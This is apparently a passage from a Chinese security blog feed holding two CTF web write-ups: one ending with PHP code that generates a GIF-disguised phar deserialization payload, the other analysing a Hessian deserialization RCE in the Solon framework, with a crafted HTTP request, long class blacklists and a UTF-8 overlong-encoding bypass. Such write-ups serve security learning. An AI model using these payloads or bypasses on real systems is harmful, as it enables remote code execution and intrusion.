class="hljs-variable constant_">FETCH_CLASSTYPE</span>,]<br>        ];<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$conn</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;users&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;conn = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PDO_connect</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&quot;UserMessage&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;shell.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;GIF89a&#x27;</span> . <span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;a.txt&quot;</span>, <span class="hljs-string">&quot;aaaaaaaaaaaaa&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br><span class="hljs-variable">$file_contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;shell.phar&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$file_contents</span>));<br></code></pre></td></tr></table></figure><p>如果是出网可以用自己的mysql啥的搭一个形如这样的表：</p><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207193637143.png" alt="image-20250207193637143"></p><p>打phar改个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-variable">$con_options</span> = <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&quot;dsn&quot;</span>=&gt;<span class="hljs-string">&quot;mysql:host=vps:3306;dbname=users;charset=utf8&quot;</span>,<br><span class="hljs-string">&#x27;host&#x27;</span>=&gt;<span class="hljs-string">&#x27;vps&#x27;</span>,<br><span class="hljs-string">&#x27;port&#x27;</span>=&gt;<span class="hljs-string">&#x27;3306&#x27;</span>,<br><span class="hljs-string">&#x27;user&#x27;</span>=&gt;<span class="hljs-string">&#x27;xxxxx&#x27;</span>,<br><span class="hljs-string">&#x27;password&#x27;</span>=&gt;<span class="hljs-string">&#x27;xxxxx&#x27;</span>,<br><span class="hljs-string">&#x27;charset&#x27;</span>=&gt;<span class="hljs-string">&#x27;utf8&#x27;</span>,<br><span class="hljs-string">&#x27;options&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>=&gt;<span class="hljs-number">262152</span>,<br>PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span> =&gt; PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>)<br>);<br></code></pre></td></tr></table></figure><p>因为：</p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207193800192.png" class="" title="image-20250207193800192"><p>gxn师傅纯赛棍啊。</p><p>正常不出网打法就是下面：</p><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207193357209.png" alt="image-20250207193357209"></p><p>然后delete触发phar：</p><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207193402460.png" alt="image-20250207193402460"></p><p>然后访问log下&#x2F;flag的md5路径，就能看到flag了：</p><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207193418690.png" alt="image-20250207193418690"></p><p>思路无敌了。确实赛棍题目。</p><p>参考：</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18620905">DASCTF 2024最后一战-WEB-gxngxngxn - gxngxngxn - 博客园</a></p><p><a href="https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3gaim7fr89ed2#WLMQy">DASCTF2024最后一战｜寒夜破晓，冬至终章 官方WP</a></p><p><a href="https://blog.lie.moe/2024/12/22/dasctf_2024.12_writeup/">DASCTF 2024最后一战 WriteUp题解 | 梓漪の窝</a></p><p><a href="https://xu17.top/2024/12/23/2024DASCTF/#yaml">DASCTF 2024最后一战 wp - XU17</a></p><p><a href="https://c1oudfl0w0.github.io/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/#strange-php%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89">(・ω&lt; )★DASCTF x 0psu3 2024最后一战 | 雲流のLowest World</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2025/第二届长城杯1解题-bookmanager浅析</title>
    <link href="/2025/02/05/CISCN2025-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF0%E8%A7%A3%E9%A2%98-bookmanager%E6%B5%85%E6%9E%90/"/>
    <url>/2025/02/05/CISCN2025-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF0%E8%A7%A3%E9%A2%98-bookmanager%E6%B5%85%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当时期末复习去了没看国赛题，回头发现一道有意思的题。</p><p>又是solon框架，想起了去年我打国赛时的心情hhh</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在<code>ApiGateway</code>中定义了路由，大概意思就是将<code>BookServiceImpl</code>这个类加入到book这个路径下，也就说访问的话就是<code>/api/rest/book/xxx</code>：</p><p><img src="/2025/02/05/CISCN2025-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF0%E8%A7%A3%E9%A2%98-bookmanager%E6%B5%85%E6%9E%90/image-20250205163149854.png" alt="image-20250205163149854"></p><p>那我们就可以通过<code>/api/rest/book/getBook</code>，<code>/api/rest/book/getAllBooks</code>等来访问路由。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> server.dso.service;<br><br><span class="hljs-keyword">import</span> common.BookModel;<br><span class="hljs-keyword">import</span> common.BookService;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Component;<br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Inject;<br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Mapping;<br><span class="hljs-keyword">import</span> org.noear.solon.core.handle.Result;<br><span class="hljs-keyword">import</span> server.dso.dao.BookDao;<br><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BookServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BookService</span> &#123;<br>    <span class="hljs-meta">@Inject</span><br>    BookDao bookDao;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BookServiceImpl</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/getBook&quot;)</span><br>    <span class="hljs-keyword">public</span> Result&lt;BookModel&gt; <span class="hljs-title function_">getBook</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-type">BookModel</span> <span class="hljs-variable">book</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.bookDao.getBookByTitle(name);<br>        <span class="hljs-keyword">return</span> book == <span class="hljs-literal">null</span> ? Result.failure(<span class="hljs-string">&quot;未找到该书籍&quot;</span>) : Result.succeed(book);<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/getAllBooks&quot;)</span><br>    <span class="hljs-keyword">public</span> Result&lt;List&lt;BookModel&gt;&gt; <span class="hljs-title function_">getAllBooks</span><span class="hljs-params">()</span> &#123;<br>        List&lt;BookModel&gt; books = <span class="hljs-built_in">this</span>.bookDao.getAllBooks();<br>        <span class="hljs-keyword">return</span> Result.succeed(books);<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/getBookById&quot;)</span><br>    <span class="hljs-keyword">public</span> Result&lt;BookModel&gt; <span class="hljs-title function_">getBookById</span><span class="hljs-params">(<span class="hljs-type">long</span> bookId)</span> &#123;<br>        <span class="hljs-type">BookModel</span> <span class="hljs-variable">book</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.bookDao.getBookById(bookId);<br>        <span class="hljs-keyword">return</span> book == <span class="hljs-literal">null</span> ? Result.failure(<span class="hljs-string">&quot;未找到该书籍&quot;</span>) : Result.succeed(book);<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/addBook&quot;)</span><br>    <span class="hljs-keyword">public</span> Result&lt;String&gt; <span class="hljs-title function_">addBook</span><span class="hljs-params">(BookModel book)</span> &#123;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">isAdded</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.bookDao.addBook(book);<br>        <span class="hljs-keyword">return</span> isAdded ? Result.succeed(<span class="hljs-string">&quot;图书添加成功&quot;</span>) : Result.failure(<span class="hljs-string">&quot;图书添加失败&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>漏洞点在solon框架github页的issue处：<a href="https://github.com/opensolon/solon/issues/73/">https://github.com/opensolon/solon/issues/73/</a></p><p>当使用框架的<a href="https://solon.noear.org/article/212">GateWay</a>，并且引入官方依赖<code>solon.serialization.hessian</code>时，如果请求的<code>api</code>带有参数，请求包的<code>body</code>部分会用<code>hessian</code>进行反序列化， 从而导致远程命令执行。</p><p>这里需要改一下Content-Type，形如：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/rest/book/addBook</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/hessian<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8080<br><br><span class="language-ebnf"></span><br><span class="language-ebnf"><span class="hljs-attribute">xxxxxx</span></span><br></code></pre></td></tr></table></figure><p>发包可以看到会将<code>body</code>的内容进行<code>hessian2</code>反序列化操作:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.noear.solon.serialization.hessian/HessianActionExecutor.java<br></code></pre></td></tr></table></figure><p><img src="/2025/02/05/CISCN2025-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF0%E8%A7%A3%E9%A2%98-bookmanager%E6%B5%85%E6%9E%90/image-20250205163412584.png" alt="image-20250205163412584"></p><p>调用栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java">changeBody:<span class="hljs-number">177</span>, HessianActionExecutor (org.noear.solon.serialization.hessian)<br>buildArgs:<span class="hljs-number">61</span>, ActionExecuteHandlerDefault (org.noear.solon.core.handle)<br>executeHandle:<span class="hljs-number">47</span>, ActionExecuteHandlerDefault (org.noear.solon.core.handle)<br>executeDo:<span class="hljs-number">329</span>, Action (org.noear.solon.core.handle)<br>invoke0:<span class="hljs-number">268</span>, Action (org.noear.solon.core.handle)<br>invoke:<span class="hljs-number">215</span>, Action (org.noear.solon.core.handle)<br>handle0:<span class="hljs-number">224</span>, Gateway (org.noear.solon.core.handle)<br>doFilter:<span class="hljs-number">206</span>, Gateway (org.noear.solon.core.handle)<br>doFilter:-<span class="hljs-number">1</span>, <span class="hljs-number">521960438</span> (org.noear.solon.core.handle.Gateway$$Lambda$<span class="hljs-number">64</span>)<br>doFilter:<span class="hljs-number">24</span>, FilterChainImpl (org.noear.solon.core.handle)<br>handle:<span class="hljs-number">167</span>, Gateway (org.noear.solon.core.handle)<br>handleMain:<span class="hljs-number">33</span>, RouterHandler (org.noear.solon.core.route)<br>handleDo:<span class="hljs-number">64</span>, RouterHandler (org.noear.solon.core.route)<br>doIntercept:<span class="hljs-number">24</span>, RouterHandler (org.noear.solon.core.route)<br>doIntercept:<span class="hljs-number">47</span>, RouterInterceptorLimiter (org.noear.solon.core.route)<br>doIntercept:<span class="hljs-number">27</span>, RouterInterceptorChainImpl (org.noear.solon.core.route)<br>doIntercept:<span class="hljs-number">97</span>, ChainManager (org.noear.solon.core)<br>handle:<span class="hljs-number">93</span>, RouterHandler (org.noear.solon.core.route)<br>handle:<span class="hljs-number">41</span>, HandlerPipeline (org.noear.solon.core.handle)<br>doFilter:<span class="hljs-number">473</span>, SolonApp (org.noear.solon)<br>doFilter:-<span class="hljs-number">1</span>, <span class="hljs-number">1018937824</span> (org.noear.solon.SolonApp$$Lambda$<span class="hljs-number">15</span>)<br>doFilter:<span class="hljs-number">24</span>, FilterChainImpl (org.noear.solon.core.handle)<br>doFilter:<span class="hljs-number">49</span>, ChainManager (org.noear.solon.core)<br>tryHandle:<span class="hljs-number">419</span>, SolonApp (org.noear.solon)<br>handle:-<span class="hljs-number">1</span>, <span class="hljs-number">1506809545</span> (org.noear.solon.boot.jlhttp.XPluginImp$$Lambda$<span class="hljs-number">76</span>)<br>handleDo:<span class="hljs-number">42</span>, JlHttpContextHandler (org.noear.solon.boot.jlhttp)<br>serve:<span class="hljs-number">22</span>, JlHttpContextHandler (org.noear.solon.boot.jlhttp)<br>serve:<span class="hljs-number">2253</span>, HTTPServer (org.noear.solon.boot.jlhttp)<br>handleMethod:<span class="hljs-number">2215</span>, HTTPServer (org.noear.solon.boot.jlhttp)<br>handleTransaction:<span class="hljs-number">2154</span>, HTTPServer (org.noear.solon.boot.jlhttp)<br>handleConnection:<span class="hljs-number">2114</span>, HTTPServer (org.noear.solon.boot.jlhttp)<br>execute:<span class="hljs-number">1895</span>, HTTPServer$SocketHandlerThread (org.noear.solon.boot.jlhttp)<br>lambda$run$<span class="hljs-number">0</span>:<span class="hljs-number">1867</span>, HTTPServer$SocketHandlerThread (org.noear.solon.boot.jlhttp)<br>run:-<span class="hljs-number">1</span>, <span class="hljs-number">571100326</span> (org.noear.solon.boot.jlhttp.HTTPServer$SocketHandlerThread$$Lambda$<span class="hljs-number">83</span>)<br>runWorker:<span class="hljs-number">1142</span>, ThreadPoolExecutor (java.util.concurrent)<br>run:<span class="hljs-number">617</span>, ThreadPoolExecutor$Worker (java.util.concurrent)<br>run:<span class="hljs-number">745</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>但是查看源码会发现readObject之前有个判断，不难看出是KMP算法的字符串匹配，也就是弄了个blacklist的过滤：</p><p><img src="/2025/02/05/CISCN2025-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF0%E8%A7%A3%E9%A2%98-bookmanager%E6%B5%85%E6%9E%90/image-20250205163958310.png" alt="image-20250205163958310"></p><p><code>testCases</code>内容简单转换一下，可得到黑名单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs java">bsh.<br>ch.qos.logback.core.db.<br>clojure.<br>com.alibaba.citrus.springext.support.parser.<br>com.alibaba.citrus.springext.util.SpringExtUtil.<br>com.alibaba.druid.pool.<br>com.alibaba.hotcode.internal.org.apache.commons.collections.functors.<br>com.alipay.custrelation.service.model.redress.<br>com.alipay.oceanbase.obproxy.druid.pool.<br>com.caucho.config.types.<br>com.caucho.hessian.test.<br>com.caucho.naming.<br>com.ibm.jtc.jax.xml.bind.v2.runtime.unmarshaller.<br>com.ibm.xltxe.rnm1.xtq.bcel.util.<br>com.mchange.v2.c3p0.<br>com.mysql.jdbc.util.<br>com.rometools.rome.feed.<br>com.sun.corba.se.impl.<br>com.sun.corba.se.spi.orbutil.<br>com.sun.jndi.ldap<br>com.sun.jndi.rmi.<br>com.sun.jndi.toolkit.<br>com.sun.org.apache.bcel.internal.<br>com.sun.org.apache.xalan.internal.<br>com.sun.rowset.<br>com.sun.xml.internal.bind.v2.<br>com.taobao.vipserver.commons.collections.functors.<br>groovy.lang.<br>java.awt.<br>java.beans.<br>java.lang.ProcessBuilder<br>java.lang.Runtime<br>java.rmi.server.<br>java.security.<br>java.util.ServiceLoader<br>java.util.StringTokenizer<br>javassist.bytecode.annotation.<br>javassist.tools.web.Viewer<br>javassist.util.proxy.<br>javax.imageio.<br>javax.imageio.spi.<br>javax.management.<br>javax.media.jai.remote.<br>javax.naming.<br>javax.script.<br>javax.sound.sampled.<br>javax.swing.<br>javax.xml.transform.<br>net.bytebuddy.dynamic.loading.<br>oracle.jdbc.connector.<br>oracle.jdbc.pool.<br>org.apache.aries.transaction.jms.<br>org.apache.bcel.util.<br>org.apache.carbondata.core.scan.expression.<br>org.apache.commons.beanutils.<br>org.apache.commons.codec.binary.<br>org.apache.commons.collections.functors.<br>org.apache.commons.collections4.functors.<br>org.apache.commons.codec.<br>org.apache.commons.configuration.<br>org.apache.commons.configuration2.<br>org.apache.commons.dbcp.datasources.<br>org.apache.commons.dbcp2.datasources.<br>org.apache.commons.fileupload.disk.<br>org.apache.ibatis.executor.loader.<br>org.apache.ibatis.javassist.bytecode.<br>org.apache.ibatis.javassist.tools.<br>org.apache.ibatis.javassist.util.<br>org.apache.ignite.cache.<br>org.apache.log.output.db.<br>org.apache.log4j.receivers.db.<br>org.apache.myfaces.view.facelets.el.<br>org.apache.openjpa.ee.<br>org.apache.shiro.<br>org.apache.tomcat.dbcp.<br>org.apache.velocity.runtime.<br>org.apache.velocity.<br>org.apache.wicket.util.<br>org.apache.xalan.xsltc.trax.<br>org.apache.xbean.naming.context.<br>org.apache.xpath.<br>org.apache.zookeeper.<br>org.aspectj.<br>org.codehaus.groovy.runtime.<br>org.datanucleus.store.rdbms.datasource.dbcp.datasources.<br>org.dom4j.<br>org.eclipse.jetty.util.log.<br>org.geotools.filter.<br>org.h2.value.<br>org.hibernate.tuple.component.<br>org.hibernate.type.<br>org.jboss.ejb3.<br>org.jboss.proxy.ejb.<br>org.jboss.resteasy.plugins.server.resourcefactory.<br>org.jboss.weld.interceptor.builder.<br>org.junit.<br>org.mockito.internal.creation.cglib.<br>org.mortbay.log.<br>org.mockito.<br>org.thymeleaf.<br>org.quartz.<br>org.springframework.aop.aspectj.<br>org.springframework.beans.BeanWrapperImpl$BeanPropertyHandler<br>org.springframework.beans.factory.<br>org.springframework.expression.spel.<br>org.springframework.jndi.<br>org.springframework.orm.<br>org.springframework.transaction.<br>org.yaml.snakeyaml.tokens.<br>ognl.<br>pstore.shaded.org.apache.commons.collections.<br>sun.print.<br>sun.rmi.server.<br>sun.rmi.transport.<br>weblogic.ejb20.internal.<br>weblogic.jms.common.<br></code></pre></td></tr></table></figure><p>看起来唬人，给你ban得差不多了，但是就是因为他使用的KMP算法匹配，可以使用<a href="https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/#/hessian">UTF-8-Overlong-Encoding</a>绕过。（X1哥还是太强了）</p><p>但是直接利用还是失败了，调试一下会发现还有个黑名单的限制：</p><p><img src="/2025/02/05/CISCN2025-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF0%E8%A7%A3%E9%A2%98-bookmanager%E6%B5%85%E6%9E%90/image-20250205164247175.png" alt="image-20250205164247175"></p><p>这个存在于hessian-lite中的<code>ClassFactory</code>里：</p><p><img src="/2025/02/05/CISCN2025-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF0%E8%A7%A3%E9%A2%98-bookmanager%E6%B5%85%E6%9E%90/image-20250205164350440.png" alt="image-20250205164350440"></p><p>转换一下，我们能得到黑名单2：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs java">bsh.<br>ch.qos.logback.core.db.<br>clojure.<br>com.alibaba.citrus.springext.support.parser.<br>com.alibaba.citrus.springext.util.SpringExtUtil.<br>com.alibaba.druid.pool.<br>com.alibaba.hotcode.internal.org.apache.commons.collections.functors.<br>com.alipay.custrelation.service.model.redress.<br>com.alipay.oceanbase.obproxy.druid.pool.<br>com.caucho.config.types.<br>com.caucho.hessian.test.<br>com.caucho.naming.<br>com.ibm.jtc.jax.xml.bind.v2.runtime.unmarshaller.<br>com.ibm.xltxe.rnm1.xtq.bcel.util.<br>com.mchange.v2.c3p0.<br>com.mysql.jdbc.util.<br>com.rometools.rome.feed.<br>com.sun.corba.se.impl.<br>com.sun.corba.se.spi.orbutil.<br>com.sun.jndi.rmi.<br>com.sun.jndi.toolkit.<br>com.sun.org.apache.bcel.internal.<br>com.sun.org.apache.xalan.internal.<br>com.sun.rowset.<br>com.sun.xml.internal.bind.v2.<br>com.taobao.vipserver.commons.collections.functors.<br>groovy.lang.<br>java.awt.<br>java.beans.<br>java.lang.ProcessBuilder<br>java.lang.Runtime<br>java.rmi.server.<br>java.security.<br>java.util.ServiceLoader<br>java.util.StringTokenizer<br>javassist.bytecode.annotation.<br>javassist.tools.web.Viewer<br>javassist.util.proxy.<br>javax.imageio.<br>jav